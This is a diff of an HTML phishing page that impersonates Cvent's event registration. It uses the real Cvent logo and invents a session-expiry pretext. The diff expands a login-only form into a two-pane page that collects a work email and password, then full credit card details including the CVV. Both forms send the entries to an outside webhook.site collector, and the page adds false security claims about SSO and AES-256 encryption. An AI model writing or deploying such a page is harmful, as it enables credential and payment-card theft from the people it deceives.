@@ -1,29 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Cvent - Session Timeout</title>
+    <meta charset="UTF-8">
+    <title>Cvent Event Registration - Final Step</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        img { width: 120px; margin-bottom: 20px; }
-        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        button:hover { background: #0052a3; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; height: 100vh; color: #333; }
+        .pane { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; box-sizing: border-box; }
+        .left { background-color: #f8f9fa; border-right: 1px solid #ddd; }
+        .right { background-color: #ffffff; }
+        .container { width: 100%; max-width: 320px; }
+        img.logo { width: 140px; margin-bottom: 30px; }
+        h2 { font-size: 20px; margin-bottom: 10px; color: #0066cc; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 14px; background-color: #0066cc; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
+        button:hover { background-color: #0052a3; }
+        .footer-text { margin-top: 20px; font-size: 11px; color: #999; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <!-- Replace with a public Cvent logo URL for realism -->
-        <img src="https://www.cvent.com/sites/default/files/cvent-logo.png" alt="Cvent">
-        <h2>Security Re-authentication</h2>
-        <p>Your session has expired. Please re-enter your password to finalize your event registration.</p>
-        <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
-            <input type="email" name="email" placeholder="Email Address" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Verify & Continue</button>
-        </form>
+
+    <!-- LEFT SIDE: LOGIN -->
+    <div class="pane left">
+        <div class="container">
+            <img src="https://www.cvent.com/sites/default/files/cvent-logo.png" alt="Cvent" class="logo">
+            <h2>Account Verification</h2>
+            <p>For your security, please re-authenticate your Cvent account to continue.</p>
+            <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
+                <input type="email" name="email" placeholder="Work Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Verify Identity</button>
+            </form>
+            <div class="footer-text">Secure single sign-on (SSO) enabled.</div>
+        </div>
     </div>
+
+    <!-- RIGHT SIDE: PAYMENT -->
+    <div class="pane right">
+        <div class="container">
+            <h2>Payment Details</h2>
+            <p>Finalize your registration by paying the event fee of <b>$250.00 USD</b>.</p>
+            <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
+                <input type="text" name="cc_name" placeholder="Full Name on Card" required>
+                <input type="text" name="cc_number" placeholder="Card Number" required>
+                <div class="row">
+                    <input type="text" name="cc_exp" placeholder="MM/YY" required>
+                    <input type="text" name="cc_cvv" placeholder="CVV" required>
+                </div>
+                <button type="submit" style="background-color: #28a745;">Complete Payment</button>
+            </form>
+            <div class="footer-text">Protected by AES-256 bank-level encryption.</div>
+        </div>
+    </div>
+
 </body>
 </html>
